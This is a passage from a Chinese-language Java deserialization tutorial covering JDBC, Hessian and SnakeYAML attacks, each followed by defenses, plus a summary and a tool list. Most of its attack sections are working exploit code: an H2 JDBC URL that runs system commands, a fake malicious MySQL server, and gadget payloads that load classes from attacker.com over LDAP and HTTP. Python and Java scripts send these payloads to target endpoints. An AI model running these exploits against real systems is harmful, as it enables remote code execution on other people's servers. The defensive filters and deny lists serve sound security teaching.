        
        // 危险！
        Connection conn = DriverManager.getConnection(dbUrl, "user", "pass");
        
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery("SELECT * FROM users");
        
        while (rs.next()) {
            System.out.println(rs.getString("name"));
        }
    }
}
```

### 9.3 Payload构造

#### H2 Database RCE

```java
public class H2JDBCPayload {
    public static void main(String[] args) {
        // H2 Database RCE Payload
        String payload = "jdbc:h2:mem:test;" +
            "INIT=CREATE ALIAS EXEC AS 'String exec(String cmd) throws Exception {" +
            "return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(" +
            "\"\\A\").next();}';" +
            "CALL EXEC('whoami')";
        
        System.out.println("H2 Payload: " + payload);
    }
}
```

#### MySQL反序列化

```python
#!/usr/bin/env python3
import socket
import struct
import sys

class FakeMySQLServer:
    """恶意MySQL服务器，返回序列化数据"""
    
    def __init__(self, port=3306):
        self.port = port
        self.payload = b''
    
    def set_payload(self, payload_file):
        with open(payload_file, 'rb') as f:
            self.payload = f.read()
    
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(5)
        
        print(f"[*] Fake MySQL server listening on port {self.port}")
        
        while True:
            conn, addr = sock.accept()
            print(f"[*] Connection from {addr}")
            
            # 发送MySQL握手包
            self.send_handshake(conn)
            
            # 接收客户端响应
            data = conn.recv(1024)
            
            # 发送OK包
            self.send_ok(conn)
            
            # 发送包含序列化数据的查询结果
            self.send_deserialization_payload(conn)
            
            conn.close()
    
    def send_handshake(self, conn):
        """发送MySQL握手包"""
        packet = b'\x4a\x00\x00\x00'  # 长度
        packet += b'\x0a'  # 协议版本
        packet += b'5.7.33\x00'  # 服务器版本
        packet += b'\x01\x00\x00\x00'  # 连接ID
        packet += b'\x00' * 8  # 认证插件数据
        packet += b'\x00'  # 填充
        packet += struct.pack('<H', 0x01a5)  # 能力标志
        packet += b'\x21'  # 字符集
        packet += struct.pack('<H', 0x0002)  # 状态标志
        packet += struct.pack('<H', 0x01a5)  # 扩展能力标志
        packet += b'\x15'  # 认证插件数据长度
        packet += b'\x00' * 10  # 保留
        packet += b'\x00' * 12  # 认证插件数据2
        packet += b'mysql_native_password\x00'
        
        conn.send(packet)
    
    def send_ok(self, conn):
        """发送OK包"""
        packet = b'\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00'
        conn.send(packet)
    
    def send_deserialization_payload(self, conn):
        """发送包含序列化数据的查询结果"""
        # 构造包含序列化数据的MySQL结果集
        # 这里简化处理，实际需要构造完整的MySQL协议包
        header = b'\x01\x00\x00\x02'  # 列数
        conn.send(header)
        
        # 发送序列化数据
        conn.send(self.payload)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <payload_file>")
        sys.exit(1)
    
    server = FakeMySQLServer()
    server.set_payload(sys.argv[1])
    server.run()

if __name__ == "__main__":
    main()
```

#### PostgreSQL socketFactory

```java
public class PostgreSQLPayload {
    public static void main(String[] args) {
        // PostgreSQL利用socketFactory加载恶意类
        String payload = "jdbc:postgresql://localhost/test?" +
            "socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&" +
            "socketFactoryArg=http://attacker.com/evil.xml";
        
        System.out.println("PostgreSQL Payload: " + payload);
    }
}
```

### 9.4 利用代码示例

```java
import java.sql.*;
import java.io.*;
import java.net.*;

public class JDBCExploit {
    public static void main(String[] args) throws Exception {
        // H2 Database利用
        String h2Payload = "jdbc:h2:mem:test;" +
            "INIT=CREATE ALIAS EXEC AS 'String exec(String cmd) throws Exception {" +
            "return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(" +
            "\"\\\\A\").next();}';" +
            "CALL EXEC('whoami')";
        
        // 连接并执行
        Connection conn = DriverManager.getConnection(h2Payload, "sa", "");
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery("CALL EXEC('whoami')");
        
        while (rs.next()) {
            System.out.println("Result: " + rs.getString(1));
        }
        
        conn.close();
    }
}
```

### 9.5 防御措施

```java
// 1. 白名单限制JDBC URL
public class SafeJDBC {
    private static final Set<String> ALLOWED_PROTOCOLS = new HashSet<>(Arrays.asList(
        "jdbc:mysql", "jdbc:postgresql", "jdbc:oracle"
    ));
    
    private static final Set<String> DENIED_PROPERTIES = new HashSet<>(Arrays.asList(
        "socketFactory", "INIT", "RUNSCRIPT", "CREATE ALIAS"
    ));
    
    public Connection safeConnect(String url, String user, String password) throws SQLException {
        // 验证协议
        boolean allowed = false;
        for (String protocol : ALLOWED_PROTOCOLS) {
            if (url.startsWith(protocol)) {
                allowed = true;
                break;
            }
        }
        if (!allowed) {
            throw new SQLException("JDBC protocol not allowed");
        }
        
        // 检查危险属性
        for (String prop : DENIED_PROPERTIES) {
            if (url.contains(prop)) {
                throw new SQLException("Dangerous JDBC property detected");
            }
        }
        
        return DriverManager.getConnection(url, user, password);
    }
}

// 2. 使用连接池，限制配置
// HikariCP示例
HikariConfig config = new HikariConfig();
config.setJdbcUrl("jdbc:mysql://localhost:3306/mydb");
config.setUsername("user");
config.setPassword("pass");
// 不允许动态修改URL
config.setConnectionInitSql("SELECT 1");

// 3. 禁用危险的JDBC特性
// MySQL：allowLoadLocalInfile=false
// PostgreSQL：不允许socketFactory参数

// 4. 网络隔离
// 限制数据库服务器只能访问必要的服务
```

---

## 10. Hessian 反序列化

### 10.1 原理讲解

Hessian是一个轻量级的二进制RPC协议，由Caucho Technology开发。Hessian使用自己的序列化格式，不同于Java原生序列化。Hessian反序列化漏洞通常发生在反序列化过程中自动调用特定方法。

#### Hessian协议特点

```
┌─────────────────────────────────────────────────────────────┐
│                    Hessian协议特点                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 二进制协议，比XML/JSON更紧凑                             │
│  2. 支持跨语言（Java、Python、PHP等）                        │
│  3. 反序列化时会调用对象的setter和getter方法                 │
│  4. 支持Map/List等集合类型                                   │
│  5. 通过HessianInput/HessianOutput进行序列化/反序列化       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    Hessian反序列化漏洞流程                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  HessianInput.readObject()                                  │
│       ↓                                                     │
│  读取类型信息                                               │
│       ↓                                                     │
│  实例化对象                                                 │
│       ↓                                                     │
│  调用setter方法设置属性                                     │
│       ↓                                                     │
│  某些类的setter会触发危险操作                               │
│       ↓                                                     │
│  如：JdbcRowSetImpl.setDataSourceName()                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 10.2 漏洞代码示例

```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import java.io.*;

public class VulnerableHessian {
    public static void main(String[] args) throws Exception {
        // 从请求读取Hessian数据
        InputStream is = request.getInputStream();
        
        // 危险：直接反序列化
        HessianInput hi = new HessianInput(is);
        Object obj = hi.readObject();
        
        System.out.println("Deserialized: " + obj);
    }
}
```

### 10.3 Payload构造

#### 手动构造Hessian Payload

```java
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import java.io.*;

public class HessianPayload {
    public static void main(String[] args) throws Exception {
        // 创建恶意对象
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://attacker.com:1389/EvilClass");
        
        // Hessian序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        HessianOutput ho = new HessianOutput(baos);
        ho.writeObject(jdbcRowSet);
        ho.flush();
        
        byte[] payload = baos.toByteArray();
        
        // 保存Payload
        FileOutputStream fos = new FileOutputStream("hessian_payload.bin");
        fos.write(payload);
        fos.close();
        
        System.out.println("Hessian Payload generated: " + payload.length + " bytes");
    }
}
```

#### 使用marshalsec生成

```bash
# 生成Hessian Payload
java -cp marshalsec.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor ldap://attacker.com:1389/EvilClass > hessian_payload.bin

# 或者使用Rome链
java -cp marshalsec.jar marshalsec.Hessian Rome ldap://attacker.com:1389/EvilClass > hessian_rome_payload.bin
```

#### 完整利用代码

```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import java.io.*;
import java.net.*;

public class HessianExploit {
    public static void main(String[] args) throws Exception {
        // 读取Payload
        byte[] payload = readFile("hessian_payload.bin");
        
        // 发送Payload
        String target = "http://vulnerable-app.com/api/hessian";
        sendPayload(target, payload);
    }
    
    private static void sendPayload(String target, byte[] payload) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-hessian");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload);
        os.flush();
        os.close();
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 10.4 利用代码示例

```python
#!/usr/bin/env python3
import requests
import subprocess
import sys

def generate_payload(gadget, command):
    """使用marshalsec生成Hessian Payload"""
    cmd = [
        "java", "-cp", "marshalsec.jar",
        f"marshalsec.Hessian", gadget,
        f"ldap://attacker.com:1389/{command}"
    ]
    result = subprocess.run(cmd, capture_output=True)
    return result.stdout

def exploit(target, payload):
    """发送攻击请求"""
    headers = {
        "Content-Type": "application/x-hessian"
    }
    
    try:
        resp = requests.post(target, data=payload, headers=headers, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <gadget> <command>")
        print(f"Gadgets: SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean")
        sys.exit(1)
    
    target = sys.argv[1]
    gadget = sys.argv[2]
    command = sys.argv[3]
    
    payload = generate_payload(gadget, command)
    print(f"Payload size: {len(payload)} bytes")
    
    exploit(target, payload)

if __name__ == "__main__":
    main()
```

### 10.5 防御措施

```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.SerializerFactory;
import java.io.*;

public class HessianDefense {
    public static void main(String[] args) throws Exception {
        // 1. 使用白名单限制反序列化类
        SerializerFactory factory = new SerializerFactory() {
            @Override
            public ClassLoader getClassLoader() {
                return super.getClassLoader();
            }
            
            @Override
            public Object readObject(Class cl, HessianInput in) throws IOException {
                // 检查类是否在白名单中
                if (!isAllowed(cl)) {
                    throw new IOException("Class not allowed: " + cl.getName());
                }
                return super.readObject(cl, in);
            }
            
            private boolean isAllowed(Class<?> cl) {
                // 白名单检查
                return cl.getName().startsWith("com.safe.") ||
                       cl.getName().startsWith("java.lang.") ||
                       cl.getName().startsWith("java.util.");
            }
        };
        
        // 2. 禁用特定类的反序列化
        factory.addForbiddenClass("com.sun.rowset.JdbcRowSetImpl");
        factory.addForbiddenClass("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        
        // 3. 使用安全的HessianInput
        InputStream is = new FileInputStream("data.bin");
        HessianInput hi = new HessianInput(is);
        hi.setSerializerFactory(factory);
        
        Object obj = hi.readObject();
        System.out.println("Deserialized: " + obj);
        
        // 4. 升级到Hessian 4.0.66+（修复了部分漏洞）
        
        // 5. 使用JSON替代Hessian
        // Gson gson = new Gson();
        // Object obj = gson.fromJson(json, MyClass.class);
    }
}
```

---

## 11. SnakeYAML 反序列化

### 11.1 原理讲解

SnakeYAML是一个Java的YAML解析库。YAML格式支持通过 `!!` 标签指定类型，这就允许攻击者在YAML中指定任意Java类进行实例化。

#### YAML语法与漏洞

```
┌─────────────────────────────────────────────────────────────┐
│                    SnakeYAML漏洞原理                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  正常YAML：                                                 │
│  name: admin                                               │
│  age: 25                                                   │
│                                                             │
│  恶意YAML（指定类型）：                                     │
│  !!javax.script.ScriptEngineManager [                      │
│    !!java.net.URLClassLoader [[                             │
│      !!java.net.URL ["http://attacker.com/"]               │
│    ]]                                                      │
│  ]                                                         │
│                                                             │
│  解析过程：                                                 │
│  1. SnakeYAML看到!!标签                                    │
│  2. 实例化指定的类                                         │
│  3. 调用构造方法或setter                                   │
│  4. 触发恶意代码执行                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 11.2 漏洞代码示例

```java
import org.yaml.snakeyaml.Yaml;

public class VulnerableSnakeYAML {
    public static void main(String[] args) {
        // 危险：直接解析用户输入的YAML
        String userInput = request.getParameter("yaml");
        
        Yaml yaml = new Yaml();
        // 危险！会执行任意代码
        Object obj = yaml.load(userInput);
        
        System.out.println("Parsed: " + obj);
    }
}
```

### 11.3 Payload构造

#### ScriptEngineManager Payload

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/"]
  ]]
]
```

#### JdbcRowSetImpl Payload

```yaml
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: ldap://attacker.com:1389/EvilClass
  autoCommit: true
```

#### 完整利用代码

```java
import org.yaml.snakeyaml.Yaml;
import java.io.*;

public class SnakeYAMLPayload {
    public static void main(String[] args) throws Exception {
        // 构造恶意YAML
        String yamlPayload = 
            "!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"http://attacker.com/\"]\n" +
            "  ]]\n" +
            "]";
        
        // 保存Payload
        writeFile("snakeyaml_payload.txt", yamlPayload.getBytes());
        
        System.out.println("Payload generated!");
    }
    
    private static void writeFile(String filename, byte[] data) throws Exception {
        FileOutputStream fos = new FileOutputStream(filename);
        fos.write(data);
        fos.close();
    }
}
```

#### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys

def generate_payload(payload_type):
    """生成SnakeYAML Payload"""
    if payload_type == "script":
        return """!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/"]
  ]]
]"""
    elif payload_type == "jdbc":
        return """!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: ldap://attacker.com:1389/EvilClass
  autoCommit: true"""
    elif payload_type == "runtime":
        return """!!java.lang.Runtime [!!java.lang.Runtime [].exec("calc")]"""
    return ""

def exploit(target, payload):
    """发送攻击请求"""
    headers = {
        "Content-Type": "application/x-yaml"
    }
    
    try:
        resp = requests.post(target, data=payload, headers=headers, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <payload_type>")
        print(f"Payload types: script, jdbc, runtime")
        sys.exit(1)
    
    target = sys.argv[1]
    payload_type = sys.argv[2]
    
    payload = generate_payload(payload_type)
    print("Payload:")
    print(payload)
    print()
    
    exploit(target, payload)

if __name__ == "__main__":
    main()
```

### 11.4 利用代码示例

```java
import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;

public class SnakeYAMLExploit {
    public static void main(String[] args) throws Exception {
        // 读取Payload
        String payload = readFile("snakeyaml_payload.txt");
        
        // 发送Payload
        String target = "http://vulnerable-app.com/api/yaml";
        sendPayload(target, payload);
    }
    
    private static void sendPayload(String target, String payload) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-yaml");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload.getBytes());
        os.flush();
        os.close();
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
    
    private static String readFile(String filename) throws Exception {
        BufferedReader reader = new BufferedReader(new FileReader(filename));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        return sb.toString();
    }
}
```

### 11.5 防御措施

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import org.yaml.snakeyaml.representer.Representer;
import org.yaml.snakeyaml.LoaderOptions;

public class SnakeYAMLDefense {
    public static void main(String[] args) {
        String yaml = "name: admin\nage: 25";
        
        // 1. 使用SafeConstructor（推荐）
        // SafeConstructor禁止实例化任意Java对象
        LoaderOptions loaderOptions = new LoaderOptions();
        Yaml safeYaml = new Yaml(new SafeConstructor(loaderOptions));
        
        Object obj = safeYaml.load(yaml);
        System.out.println("Safe parsed: " + obj);
        
        // 2. 自定义Constructor，限制允许的类
        LoaderOptions options = new LoaderOptions();
        options.setCodePointLimit(5 * 1024 * 1024); // 5MB限制
        
        Yaml restrictedYaml = new Yaml(new RestrictedConstructor(options));
        
        // 3. 升级到SnakeYAML 2.0+
        // SnakeYAML 2.0默认禁用全局标签（!!）
        
        // 4. 使用JSON替代YAML
        // Gson gson = new Gson();
        // Object obj = gson.fromJson(json, MyClass.class);
        
        // 5. 输入验证
        if (yaml.contains("!!")) {
            throw new IllegalArgumentException("Global tags not allowed");
        }
    }
}

// 自定义Constructor
class RestrictedConstructor extends SafeConstructor {
    public RestrictedConstructor(LoaderOptions loadingConfig) {
        super(loadingConfig);
    }
    
    @Override
    protected Class<?> getClassForName(String name) throws ClassNotFoundException {
        // 只允许特定类
        if (!name.startsWith("com.safe.") && !name.startsWith("java.util.")) {
            throw new ClassNotFoundException("Class not allowed: " + name);
        }
        return super.getClassForName(name);
    }
}
```

---

## 通用防御措施

### 1. 代码层面防御

```java
// 1. 永远不要反序列化不可信的数据
// 危险
Object obj = ois.readObject(untrustedData);

// 安全：使用JSON
Object obj = gson.fromJson(json, SafeClass.class);

// 2. 使用ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=5;" +
    "!com.sun.rowset.JdbcRowSetImpl;" +
    "!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;" +
    "!java.lang.Runtime;" +
    "!java.lang.ProcessBuilder"
);
ois.setObjectInputFilter(filter);

// 3. 自定义ObjectInputStream
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = new HashSet<>(Arrays.asList(
        "com.safe.MyClass",
        "java.lang.String",
        "java.util.ArrayList"
    ));
    
    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization", desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// 4. 使用签名验证
public class SignedSerialization {
    private static final String HMAC_ALGORITHM = "HmacSHA256";
    private final SecretKey secretKey;
    
    public byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        
        byte[] data = baos.toByteArray();
        byte[] signature = hmac(data);
        
        byte[] result = new byte[signature.length + data.length];
        System.arraycopy(signature, 0, result, 0, signature.length);
        System.arraycopy(data, 0, result, signature.length, data.length);
        
        return result;
    }
    
    public Object deserialize(byte[] data) throws Exception {
        byte[] signature = Arrays.copyOfRange(data, 0, 32);
        byte[] serialized = Arrays.copyOfRange(data, 32, data.length);
        
        byte[] expected = hmac(serialized);
        if (!MessageDigest.isEqual(signature, expected)) {
            throw new SecurityException("Invalid signature");
        }
        
        ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(serialized));
        return ois.readObject();
    }
    
    private byte[] hmac(byte[] data) throws Exception {
        Mac mac = Mac.getInstance(HMAC_ALGORITHM);
        mac.init(secretKey);
        return mac.doFinal(data);
    }
}
```

### 2. 配置层面防御

```java
// 1. 禁用JNDI
System.setProperty("java.naming.factory.initial", "disabled");
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");

// 2. 设置安全管理器
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkExec(String cmd) {
        throw new SecurityException("Command execution not allowed");
    }
    
    @Override
    public void checkConnect(String host, int port) {
        // 限制网络连接
    }
});

// 3. 升级JDK
// JDK 8u191+, JDK 11.0.1+, JDK 13+ 默认禁止从远程代码库加载类

// 4. 使用RASP（Runtime Application Self-Protection）
// 部署RASP工具监控和拦截危险的反序列化操作
```

### 3. 依赖管理

```xml
<!-- pom.xml -->
<dependencies>
    <!-- 升级到安全版本 -->
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.2</version>
    </dependency>
    
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.4</version>
    </dependency>
    
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>2.0.43</version>
    </dependency>
    
    <dependency>
        <groupId>com.fasterxml.jackson.core</groupId>
        <artifactId>jackson-databind</artifactId>
        <version>2.15.2</version>
    </dependency>
    
    <dependency>
        <groupId>org.yaml</groupId>
        <artifactId>snakeyaml</artifactId>
        <version>2.2</version>
    </dependency>
</dependencies>
```

### 4. 安全开发最佳实践

```java
// 安全编码检查清单
public class SecurityChecklist {
    /*
    - [ ] 永远不要反序列化用户可控的数据
    - [ ] 如果必须反序列化，使用白名单限制类
    - [ ] 使用JSON等安全格式替代Java原生序列化
    - [ ] 对序列化数据进行签名验证
    - [ ] 禁用不必要的功能（JNDI、表达式求值等）
    - [ ] 及时更新第三方库到安全版本
    - [ ] 使用ObjectInputFilter限制反序列化
    - [ ] 部署RASP进行运行时防护
    - [ ] 定期进行依赖安全扫描
    - [ ] 对输入进行严格验证和过滤
    */
}
```

---

## 总结

### 攻击要点

| 利用链 | 核心原理 | 关键类/组件 | 适用场景 |
|--------|----------|-------------|----------|
| **CommonsBeanutils** | PropertyUtils.getProperty()触发getter | BeanComparator, TemplatesImpl | 存在CB库的环境 |
| **Shiro** | RememberMe Cookie AES解密后反序列化 | AbstractRememberMeManager | 使用Shiro的应用 |
| **RMI** | RMI通信中的序列化数据传输 | Registry, RemoteObject | RMI服务 |
| **JNDI** | lookup()加载远程恶意类 | InitialContext, JdbcRowSetImpl | 存在JNDI lookup的场景 |
| **Fastjson** | @type自动实例化任意类 | JdbcRowSetImpl, TemplatesImpl | 使用Fastjson的应用 |
| **Jackson** | defaultTyping多态类型处理 | ObjectMapper | 使用Jackson的应用 |
| **Rome** | ToStringBean触发toString() | ObjectBean, EqualsBean | 存在Rome库的环境 |
| **二次反序列化** | 一次反序列化触发另一次 | JdbcRowSetImpl + JNDI | 需要绕过限制的场景 |
| **JDBC** | 数据库URL或返回数据触发 | H2, MySQL, PostgreSQL | 数据库连接场景 |
| **Hessian** | 反序列化调用setter/getter | HessianInput | 使用Hessian的应用 |
| **SnakeYAML** | !!标签实例化任意类 | Yaml.load() | 解析YAML的场景 |

### 防御要点

1. **永远不要反序列化不可信的数据**
2. **使用JSON等安全格式替代Java原生序列化**
3. **如果必须反序列化，使用白名单限制类**
4. **禁用不必要的功能（JNDI、表达式求值等）**
5. **及时更新第三方库到安全版本**
6. **对序列化数据进行签名验证**
7. **部署RASP进行运行时防护**

### 学习路径建议

```
新手入门
    ↓
1. 学习Java序列化基础
    ↓
2. 理解反序列化漏洞原理
    ↓
3. 掌握DNSLog验证方法
    ↓
4. 学习CC链（Commons Collections）
    ↓
5. 学习CB链（CommonsBeanutils）
    ↓
6. 学习JNDI注入
    ↓
7. 学习Fastjson/Jackson反序列化
    ↓
8. 学习其他利用链（Rome、Hessian、SnakeYAML等）
    ↓
9. 学习防御措施
    ↓
10. 实战练习（CTF、靶场）
```

---

## 参考资源

### 工具

| 工具 | 用途 | 链接 |
|------|------|------|
| ysoserial | Java反序列化Payload生成 | https://github.com/frohoff/ysoserial |
| marshalsec | Java反序列化研究工具 | https://github.com/mbechler/marshalsec |
| fastjson_payload | Fastjson Payload生成 | https://github.com/safe6Sec/Fastjson |
| JNDI-Injection-Exploit | JNDI注入利用工具 | https://github.com/welk1n/JNDI-Injection-Exploit |
| ShiroExploit | Shiro反序列化利用 | https://github.com/feihong-cs/ShiroExploit |
| ysoserial-mangletcp | TCP流混淆工具 | https://github.com/GoSecure/ysoserial-mangletcp |

### 文档

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Java序列化官方文档](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serial-arch.html)
- [PayloadsAllTheThings - Java Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Java)
- [Fastjson安全公告](https://github.com/alibaba/fastjson/wiki/security_update_2022)
- [Jackson安全公告](https://github.com/FasterXML/jackson-databind/issues?q=label%3ACVE)

### 学习资料

- [Java反序列化漏洞专题](https://github.com/vulhub/vulhub/tree/master/java)
- [Java安全学习路线](https://github.com/anbai-inc/Java-Security)
- [Commons Collections反序列化分析](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)
- [Shiro RememberMe漏洞分析](https://paper.seebug.org/shiro-rememberme-1/)
- [JNDI注入深度解析](https://paper.seebug.org/jndi-injection/)

### 靶场

- [Vulhub](https://github.com/vulhub/vulhub) — 包含大量Java反序列化漏洞环境
- [WebGoat](https://github.com/WebGoat/WebGoat) — OWASP Web安全学习平台
- [CTF题目](https://github.com/ctf-wiki/ctf-wiki) — 各类CTF题目

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年6月16日*
